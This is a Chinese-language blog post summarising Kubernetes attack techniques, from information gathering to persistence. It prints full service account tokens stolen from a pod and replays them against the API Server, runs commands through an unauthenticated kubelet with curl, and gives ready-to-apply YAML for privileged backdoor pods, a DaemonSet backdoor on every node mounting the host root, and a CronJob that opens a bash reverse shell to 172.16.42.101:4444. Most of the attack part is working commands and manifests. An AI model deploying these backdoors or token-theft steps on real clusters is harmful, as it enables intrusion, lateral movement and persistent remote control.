---
title: 容器编排平台-Kubernetes安全
date: 2021-12-31 15:17:16
categories: 云原生安全
tags: 
- Kubernetes安全
---

> 有之以为利，无之以为用。

Kubernetes安全问题总结。

<!-- more -->

Kubernetes是容器编排平台的事实标准，具有较高的复杂性，使用到各种组件，但是组件和本身都可能存在漏洞。下面列举一下Kubernetes使用的组件常见开放端口

| 组件       | 默认端口 | 说明                              |
| ---------- | -------- | --------------------------------- |
| API Server | 6443     | 基于HTTPS的安全端口               |
| API Server | 8080     | 不安全的HTTP端口，不建议启用      |
| Kubelet    | 10248    | 用于检查Kubelet健康状态的HTTP端口 |
| Dashboard  | 8001     | 提供HTTP服务的端口                |
| etcd       | 2379     | 客户端与服务端通信的端口          |
| etcd       | 2380     | 不同服务端实例之间通信的端口      |





## 1. 信息收集

### 1.1 pod内获K8s Server Token

> 在Pod内收集token用于横向移动

- 命令：cat /var/run/secrets/kubernetes.io/serviceaccount/token

  ```bash
  [root@master ~]# kubectl exec -it alpine-test /bin/sh
  kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
  / # cat /var/run/secrets/kubernetes.io/serviceaccount/token
  eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjcyMjgzODA2LCJpYXQiOjE2NDA3NDc4MDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJhbHBpbmUtdGVzdCIsInVpZCI6IjNmZmY0NGUxLTEzNzUtNGViYi04MzBlLTA3Yjk3MTFlOTE0MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyJ9LCJ3YXJuYWZ0ZXIiOjE2NDA3NTE0MTN9LCJuYmYiOjE2NDA3NDc4MDYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ncqAGaslig7ut0aSxBpzg6QldCvAOt5E8i-2rB_zf8cq_Yku6n8C0nFvtiR9KzTu9OxWOjjyn7sKr8Q1xAN-S9xHwOxLG_hb-Z8gmz9VfxtM1hRE6h2JeLAZJgfRYjydrQns2JJ-3uZwKN15KNn95emZzTXMbpdhuFZyuiaOV-6q0jHsI9LhOzYczfJQhMUMXDppQzs3WuI8VckIzgjx9BZM0vgwHaNf065ak4FYGKDVNOoYhbl-b6jwaPNz0SFq0r1SUCLKa6Kn5rpcXzdOG2H_r_lTJlfTJyyFKHEmHtiYE2W9dkAk0AgyaNlZmnlr8D0bTwRahnYJ9k2N0hb9ag/ #
  / #
  ```

  成功获取到了token
  
  通过token进行访问API Server。
  
  ```bash
  [root@master manifests]# curl -k --header "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w" https://172.16.42.100:6443/api
  {
    "kind": "APIVersions",
    "versions": [
      "v1"
    ],
    "serverAddressByClientCIDRs": [
      {
        "clientCIDR": "0.0.0.0/0",
        "serverAddress": "172.16.42.100:6443"
      }
    ]
  ```
  
  

### 1.2 kubectl 获取 Api server token

- 命令：kubectl config view

  ```bash
  [root@master ~]# kubectl config view
  apiVersion: v1
  clusters:
  - cluster:
      certificate-authority-data: DATA+OMITTED
      server: https://172.16.42.100:6443
    name: kubernetes
  contexts:
  - context:
      cluster: kubernetes
      user: kubernetes-admin
    name: kubernetes-admin@kubernetes
  current-context: kubernetes-admin@kubernetes
  kind: Config
  preferences: {}
  users:
  - name: kubernetes-admin
    user:
      client-certificate-data: REDACTED
      client-key-data: REDACTED
  [root@master ~]#
  ```

  获取到Api Server地址：https://172.16.42.100:6443





### 1.3 kubectl 获取Api Server token

- 命令：kubectl describe secrets

  ```bash
  [root@master ~]# kubectl describe secrets
  Name:         default-token-7xts4
  Namespace:    default
  Labels:       <none>
  Annotations:  kubernetes.io/service-account.name: default
                kubernetes.io/service-account.uid: 720096c3-c0ea-4f03-889c-6d450ab62d2c
  
  Type:  kubernetes.io/service-account-token
  
  Data
  ====
  ca.crt:     1066 bytes
  namespace:  7 bytes
  token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w
  ```





### 1.4 pod内判断kubernetes环境

- 命令：`env | grep KUBE`

  ```bash
  / # env | grep KUBE
  KUBERNETES_SERVICE_PORT=443
  KUBERNETES_PORT=tcp://10.96.0.1:443
  KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
  KUBERNETES_PORT_443_TCP_PORT=443
  KUBERNETES_PORT_443_TCP_PROTO=tcp
  KUBERNETES_SERVICE_PORT_HTTPS=443
  KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
  KUBERNETES_SERVICE_HOST=10.96.0.1
  ```

- 命令：`cat /etc/resolv.conf`

  ```bash
  / # cat /etc/resolv.conf
  nameserver 10.96.0.10
  search default.svc.cluster.local svc.cluster.local cluster.local
  options ndots:5
  ```

- 命令：`cat /proc/1/mountinfo`



## 2. 未授权访问攻击

### 2.1 Kubernetes API Server未授权访问

**老版本中：**

默认情况，Kubernetes API Server提供HTTP的两个端口：

1）本地主机端口

- HTTP服务
- 默认端口8080，修改标识–insecure-port
- 默认IP是本地主机，修改标识—insecure-bind-address
- 在HTTP中没有认证和授权检查
- 主机访问受保护

2）Secure Port

- 默认端口6443，修改标识—secure-port
- 默认IP是首个非本地主机的网络接口，修改标识—bind-address
- HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file
- 认证方式，令牌文件或者客户端证书
- 使用基于策略的授权方式



**新版本中：**

只用默认的6443端口，并且不开启HTTP服务。

如果接口未授权访问则如下

![](../images/pic/k8s8.jpg) 





### 2.2 Kubernetes Dashboard未授权访问

Kuberntetes Dashboard是一个基于Web的Kubernetes用户界面。我们可以用它来在集中部署、调试容器化应用，或者管理集群资源。

Dashboard需要配置token才能访问，在1.10.1版本之前提供了跳过选项可以直接访问。

如下高版本中必须提供token才能登录

![](../images/pic/k8s9.jpg)



### 2.3 Kubelet未授权访问

每一个Node节点都有一个kubelet服务，kubelet监听了10250，10248，10255等端口。

其中10250端口是kubelet与apiserver进行通信的主要端口，通过该端口kubelet可以知道自己当前应该处理的任务，该端口在最新版Kubernetes是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用10250提供的能力；因为Kubernetes流行早期，很多挖矿木马基于该端口进行传播和利用，所以该组件在安全领域部分群体内部的知名度反而会高于 APIServer。

在新版本Kubernetes中当使用以下配置打开节点匿名访问时便可能存在kubelet未授权访问漏洞：

![image-20211029170007795](../images/pic/k8s10.png) 

systemctl restart kubectl

master节点执行：kubectl create clusterrolebinding the-boss --user system:anonymous --clusterrole cluster-admin



查看pods:

curl --insecure https://172.16.42.101:10250/pods

根据容器信息执行命令：curl -k https://172.16.42.101:10250/run/namespace/name/metadata-name/container-name -d "cmd=id"

```
curl -k https://172.16.42.101:10250/run/default/nginx/nginx -d "cmd=id"
```

![image-20211029173138156](../images/pic/k8s11.png) 

`curl -k https://172.16.42.101:10250/run/default/kibana-577d8c75d6-pgw5p/kibana -d "cmd=id"`





## 3. 后门pod

如果我们拥有可以创建Pod的权限，那么我们就可以部署Pod后门。

### 3.1 特权容器pod

```
apiVersion: v1
kind: Pod
metadata:
  name: shadowtest
  labels:
    creator: shadowflow
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  nodeSelector:
    # kubernetes.io/hostname 需要先查看 pod 所在的节点进行修改
    # kubectl get pods -o wide -A
    # kubernetes.io/hostname:  k8s-node1
  containers:
  - name: trpc
    image: "alpine"
    # imagePullPolicy: "Never"
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_ADMIN
    command: ["/bin/sh", "-c", "tail -f /dev/null"]
    volumeMounts:
      - name: dev
        mountPath: /host/dev
      - name: proc
        mountPath: /host/proc
      - name: sys
        mountPath: /host/sys
      - name: rootfs
        mountPath: /near_sandbox
  volumes:
    - name: proc
      hostPath:
        path: /proc
    - name: dev
      hostPath:
        path: /dev
    - name: sys
      hostPath:
        path: /sys
    - name: rootfs
      hostPath:
        path: /
```

使用如下命令即可部署

```
kubectl apply -f node_shell.yaml
```

攻击方式：

```
kubectl create -f node_shell.yaml
kubectl exec -it -f node_shell.yaml -- sh
chroot /near_sandbox/
```



部署成功后的利用方式跟特权容器逃逸是一样的，可以参考：https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/



### 3.2 Daemonset后门Pod

Daemonset后门会在每个Node上部署一个后门

从 v1.16 开始, 用 apps/v1 代替 extensions/v1beta1

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor-daemonset
  labels:
    app: backdoor-daemonset
spec:
  selector:
    matchLabels:
      app: backdoor-daemonset
  template:
    metadata:
      labels:
        app: backdoor-daemonset
    spec:
      hostNetwork: true
      hostPID: true
      restartPolicy: Always
      containers:
      - name: backdoor-daemonset
        image: nginx:1.14.2
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 81
        securityContext:
          privileged: true
          capabilities:
            add:
            - SYS_ADMIN
            - NET_ADMIN
            - SYS_PTRACE
            - AUDIT_CONTROL
            - MKNOD
            - SETFCAP
        volumeMounts:
          - name: rootfs
            mountPath: /near_sandbox
      volumes:
        - name: rootfs
          hostPath:
            path: /
```

攻击方式

```
kubectl apply -f backdoor-daemonset.yaml

kubectl exec -it backdoor-daemonset-4shzz -- /bin/bash

chroot /near_sandbox

exit
```



### 3.3 部署K8s CronJob后门Pod

CronJobs 对于创建周期性的、反复重复的任务很有用，例如执行数据备份或者发送邮件。 CronJobs 也可以用来计划在指定时间来执行的独立任务，例如计划当集群看起来很空闲时 执行某个 Job。

pod:

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor-cronjob
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor-cronjob
            image: nginx
            imagePullPolicy: IfNotPresent
            args:
            - /bin/bash
            - -c
            - "/bin/bash >& /dev/tcp/172.16.42.101/4444 0>&1"
          restartPolicy: OnFailure
```

攻击方式：

```
#创建后门cronjob
kubectl apply -f backdoor-cronjob.yaml
#查看执行情况
kubectl get jobs --watch
```

实际对抗过程中，虽然我们也会对恶意的POD和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门POD的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。





## 5. 其他攻击

除了上述常见攻击方式外，还有一些其他的攻击方式，暂时不分析，点到为止。

**1. CVE-2018-1002105**

CVE-2018-1002105是一个Kubernetes的权限提升漏洞，允许攻击者在拥有集群内低权限的情况下提升权限至Kubernetes API Server权限。所有低于v1.10.11、v1.11.5、v.12.3版本的Kubernetes均受影响。

简单来说，通过构造一个特殊的请求，攻击者能够借助Kubernetes API Server作为代理，建立一个到后端服务器的连接，进而以Kubernetes API Server的身份向后端服务器发送任意请求，实质就是权限提升。

**2. CVE-2019-11253:YAML炸弹**

CVE-2019-11253是一个存在于API Server对YAML、JSON数据解析流程中的漏洞，恶意的YAML、JSON载荷可能使API Server大量消耗CPU、内存资源，从而导致拒绝服务攻击。

**3. CVE-2019-9512/9514: HTTP/2 协议实现存在问题**

CVE-2019-9512和CVE-2019-9514存在于Kubernetes依赖的Go语言库net/http和golang.org/x/net/http2中。

- CVE-2019-9512漏洞使得kubernetes集群存在Ping Flood攻击风险：攻击者可以持续不断向HTTP/2对端发送PING帧，但不读取相应，促使对端维护一个内部队列存储产生的响应帧。如果响应帧入队列效率不高，可消耗大量CPU、内存资源。
- CVE-2019-9514漏洞使kubernetes集群存在Reset Flood攻击风险：攻击者可以开启若干个stream,在每个流上发送非法请求，这将促使对端发送一个RST_STREAM帧尝试终止。如果RST_STREAM帧入队列效率不高，可消耗大量CPU、内存资源。

**4. Kubernetes网络中间人攻击**

通过修改kube-dns服务的地址，可以在Kubernetes网络中完成中间人攻击。



## 6. 参考

《云原生安全攻防实践与体系构建》

